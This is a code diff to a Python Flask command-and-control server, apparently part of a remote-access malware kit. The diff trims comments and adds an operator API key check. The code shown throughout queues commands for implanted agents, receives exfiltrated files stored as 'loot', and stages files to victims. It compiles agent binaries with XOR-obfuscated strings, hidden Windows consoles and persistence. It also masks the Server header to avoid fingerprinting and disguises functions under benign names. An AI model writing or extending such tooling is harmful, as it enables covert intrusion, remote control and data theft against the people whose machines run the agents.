@@ -13,9 +13,7 @@ import zipfile
 
 app = Flask(__name__)
 
-# Replace the default Werkzeug/Python Server header on every response.
-# Without this, the header would immediately fingerprint the C2 server
-# as a Flask application to anyone inspecting the traffic.
+# Swap out the default Werkzeug Server header so the stack isn't fingerprinted from traffic.
 @app.after_request
 def mask_server_header(response):
     response.headers["Server"] = "nginx/1.24.0"
@@ -37,16 +35,10 @@ os.makedirs(STAGED_DIR, exist_ok=True)
 AGENT_SRC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "agent")
 
 
-# ─────────────────────────────────────────────
-#  Agent Path Initialisation
-# ─────────────────────────────────────────────
+# -- agent path init --
 
 def _init_agent_paths():
-    """
-    Load per-server random agent-facing URL paths from the database.
-    If they don't exist yet (first startup), generate them and persist them.
-    Returns a dict with keys: checkin, result, upload, files.
-    """
+    """Pull path slugs from the DB, generate them on first run."""
     import secrets
 
     keys = ["path_checkin", "path_result", "path_upload", "path_files"]
@@ -73,16 +65,50 @@ def _init_agent_paths():
 
 _agent_paths = _init_agent_paths()
 
-# Module-level path variables used by route registration and the build pipeline
+# used by route registration and the build pipeline
 AGENT_PATH_CHECKIN = _agent_paths["path_checkin"]
 AGENT_PATH_RESULT  = _agent_paths["path_result"]
 AGENT_PATH_UPLOAD  = _agent_paths["path_upload"]
 AGENT_PATH_FILES   = _agent_paths["path_files"]
 
 
-# ─────────────────────────────────────────────
-#  Dashboard Route
-# ─────────────────────────────────────────────
+# -- operator API key --
+
+def _init_api_key():
+    """Pull the operator API key from the DB, generate it if this is the first run."""
+    import secrets
+
+    conn = get_db_connection()
+    row = conn.execute(
+        "SELECT value FROM server_config WHERE key = 'api_key'"
+    ).fetchone()
+
+    if row:
+        key = row["value"]
+    else:
+        key = secrets.token_hex(16)
+        conn.execute(
+            "INSERT INTO server_config (key, value) VALUES (?, ?)",
+            ("api_key", key),
+        )
+        conn.commit()
+
+    conn.close()
+    return key
+
+
+API_KEY = _init_api_key()
+
+
+@app.before_request
+def _require_api_key():
+    """Gate every operator endpoint behind the API key."""
+    if request.path.startswith("/api/"):
+        if request.headers.get("X-API-Key") != API_KEY:
+            return jsonify({"error": "Unauthorized"}), 401
+
+
+# -- dashboard --
 
 @app.route("/")
 def dashboard():
@@ -90,18 +116,10 @@ def dashboard():
     return render_template("index.html")
 
 
-# ─────────────────────────────────────────────
-#  Agent Check-In API
-# ─────────────────────────────────────────────
+# -- agent checkin --
 
 def SyncDeviceState():
-    """
-    Agent check-in endpoint.
-    Expects: { "kid": "<8-char key fingerprint>", "data": "<base64 AES-256-GCM encrypted JSON>" }
-    Inner plaintext:  { "agent_id": "...", "hostname": "...", "os": "..." }
-    Returns encrypted: { "kid": "...", "data": "<encrypted JSON>" }
-    Inner response:   { "status": "ok", "tasks": [ { "id": ..., "command": "..." }, ... ] }
-    """
+    """Decrypt the checkin envelope, register/update the agent, return pending tasks encrypted."""
     envelope = request.get_json()
 
     # Validate envelope
@@ -165,15 +183,10 @@ def SyncDeviceState():
     return jsonify({"kid": kid, "data": enc})
 
 
-# ─────────────────────────────────────────────
-#  Crypto Helpers
-# ─────────────────────────────────────────────
+# -- crypto helpers --
 
 def _get_key_for_kid(kid: str) -> str | None:
-    """
-    Look up the AES-256 encryption key for a given key_id fingerprint.
-    Returns the 64-char hex key string, or None if the kid is not found.
-    """
+    """Look up the AES key for a given kid. Returns hex string or None."""
     conn = get_db_connection()
     row = conn.execute(
         "SELECT encryption_key FROM builds WHERE key_id = ?", (kid,)
@@ -182,17 +195,11 @@ def _get_key_for_kid(kid: str) -> str | None:
     return row["encryption_key"] if row else None
 
 
-# ─────────────────────────────────────────────
-#  DiagnosticTask Management API
-# ─────────────────────────────────────────────
+# -- task management --
 
 @app.route("/api/task", methods=["POST"])
 def submit_task():
-    """
-    Submit a new task for an agent.
-    Receives: { "agent_id": "...", "command": "..." }
-    Returns:  { "task_id": ... }
-    """
+    """Queue a command for an agent."""
     data = request.get_json()
 
     if not data or "agent_id" not in data or "command" not in data:
@@ -233,16 +240,10 @@ def get_tasks(agent_id):
     })
 
 
-# ─────────────────────────────────────────────
-#  Result API
-# ─────────────────────────────────────────────
+# -- results --
 
 def submit_result():
-    """
-    Agent submits task result.
-    Expects: { "kid": "<key fingerprint>", "data": "<encrypted JSON>" }
-    Inner plaintext: { "task_id": ..., "output": "..." }
-    """
+    """Decrypt the result envelope from the agent and store the output."""
     envelope = request.get_json()
 
     # Validate and decrypt
@@ -316,9 +317,7 @@ def get_results(task_id):
     })
 
 
-# ─────────────────────────────────────────────
-#  Agents API (for AJAX dashboard refresh)
-# ─────────────────────────────────────────────
+# -- agents --
 
 @app.route("/api/agents", methods=["GET"])
 def get_agents():
@@ -343,11 +342,7 @@ def get_agents():
 
 @app.route("/api/agents/<agent_id>", methods=["DELETE"])
 def delete_agent(agent_id):
-    """
-    Queue a self-destruct task for the agent.
-    The agent will wipe itself from the host on its next check-in.
-    The agent record is kept in the DB so it can still pick up the task.
-    """
+    """Queue a self-destruct for the agent. Record stays in the DB until the agent checks in and wipes itself."""
     conn = get_db_connection()
 
     # Check if agent exists
@@ -394,9 +389,7 @@ def force_delete_agent(agent_id):
     return jsonify({"status": "ok"})
 
 
-# ─────────────────────────────────────────────
-#  Stats API
-# ─────────────────────────────────────────────
+# -- stats --
 
 @app.route("/api/stats", methods=["GET"])
 def get_stats():
@@ -420,9 +413,7 @@ def get_stats():
     })
 
 
-# ─────────────────────────────────────────────
-#  Build / Deploy API
-# ─────────────────────────────────────────────
+# -- build --
 
 def _sanitize_interval(interval_str):
     """Validate and sanitize a Go time.Duration string like '10s', '1m', '30s'."""
@@ -447,11 +438,11 @@ def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
                         path_upload="/api/upload", path_files="/api/files/"):
     """Generate a config.go file with the given settings."""
 
-    # Generate a random 16-byte XOR key for string obfuscation
+    # fresh XOR key for this build
     xor_key = os.urandom(16)
     xor_key_hex = xor_key.hex()
 
-    # XOR-encrypt sensitive strings at build time
+    # encrypt sensitive strings so they don't show up as plaintext in the binary
     enc_server_url   = _xor_encrypt(xor_key, server_url)
     enc_checkin_path = _xor_encrypt(xor_key, path_checkin)
     enc_result_path  = _xor_encrypt(xor_key, path_result)
@@ -779,12 +770,7 @@ func transmitSecureTelemetry(url string, payload any) ([]byte, error) {{
 
 @app.route("/api/build", methods=["POST"])
 def build_agent():
-    """
-    Build an agent binary with custom configuration.
-    Receives: { "target_os": "windows", "arch": "amd64", "server_url": "...",
-                "interval": "10", "persistence": true }
-    Returns:  { "status": "ok", "filename": "...", "build_id": ... }
-    """
+    """Compile an agent binary with the given config and return the build ID."""
     data = request.get_json()
 
     if not data:
@@ -840,7 +826,7 @@ def build_agent():
     except (ValueError, TypeError):
         return jsonify({"error": "profile_id must be a number (1-5)"}), 400
 
-    # Sanitize locale (basic validation: allow alphanumerics, dashes, commas, semicolons, equals, periods)
+    # basic locale format check
     import re as _re
     if not _re.match(r'^[a-zA-Z0-9\-,;=. ]+$', locale):
         return jsonify({"error": "Invalid locale format"}), 400
@@ -885,10 +871,10 @@ def build_agent():
         env["GOARCH"] = arch
         env["CGO_ENABLED"] = "0"
 
-        # Base ldflags (strip debug symbols and DWARF info)
+        # strip debug symbols and DWARF
         ldflags = "-s -w"
 
-        # If building for Windows, hide the console window entirely
+        # no console window on Windows
         if target_os == "windows":
             ldflags += " -H=windowsgui"
 
@@ -920,7 +906,7 @@ def build_agent():
         shutil.move(output_path, final_path)
         file_size = os.path.getsize(final_path)
 
-        # Record in database
+        # save build record
         conn = get_db_connection()
         cursor = conn.execute(
             "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
@@ -1018,9 +1004,7 @@ def delete_build(build_id):
     return jsonify({"status": "ok"})
 
 
-# ─────────────────────────────────────────────
-#  Upload / Exfiltration API (Agent → Server)
-# ─────────────────────────────────────────────
+# -- upload / exfil (agent -> server) --
 
 def receive_upload():
     """Receive an exfiltrated file from an agent."""
@@ -1109,9 +1093,7 @@ def delete_loot(loot_id):
     return jsonify({"status": "ok"})
 
 
-# ─────────────────────────────────────────────
-#  File Staging API (Server → Agent)
-# ─────────────────────────────────────────────
+# -- file staging (server -> agent) --
 
 @app.route("/api/files/stage", methods=["POST"])
 def stage_file():
@@ -1201,16 +1183,13 @@ def delete_staged_file(file_id):
     return jsonify({"status": "ok"})
 
 
-# ─────────────────────────────────────────────
-#  Agent Route Registration
-# ─────────────────────────────────────────────
+# -- agent route registration --
 
 def _register_agent_routes():
     """
-    Register the four agent-facing endpoints on their randomised paths.
-    Called once at module load after AGENT_PATH_* variables are set.
-    Using add_url_rule() instead of decorators because the paths are
-    only known after the DB is read, not at import time.
+    Wire up the four agent endpoints to their randomised paths.
+    Uses add_url_rule() instead of decorators because the paths come
+    from the DB and aren't known until after init.
     """
     app.add_url_rule(AGENT_PATH_CHECKIN, "agent_checkin", SyncDeviceState, methods=["POST"])
     app.add_url_rule(AGENT_PATH_RESULT,  "agent_result",  submit_result,   methods=["POST"])
@@ -1226,18 +1205,18 @@ def _register_agent_routes():
 _register_agent_routes()
 
 
-# ─────────────────────────────────────────────
-#  Entry Point
-# ─────────────────────────────────────────────
+# -- entry point --
 
 if __name__ == "__main__":
-    # Patch Werkzeug's transport-level Server header before starting.
-    # Flask's @after_request hook only controls the response object, but
-    # Werkzeug's dev server writes its own Server line directly to the socket
-    # before that hook runs. Without this patch both headers appear in the
-    # response, which is worse than one because it reveals the masking attempt.
+    # Werkzeug writes its own Server header at the socket level before our
+    # @after_request hook fires. Patch it here or both headers show up in the response.
     from werkzeug.serving import WSGIRequestHandler
     setattr(WSGIRequestHandler, "server_version", "nginx/1.24.0")
     setattr(WSGIRequestHandler, "sys_version", "")
+
+    print("\n=======================================")
+    print("  Operator API Key (paste into dashboard):")
+    print(f"  {API_KEY}")
+    print("=======================================\n")
 
     app.run(host="0.0.0.0", port=5000, debug=False)
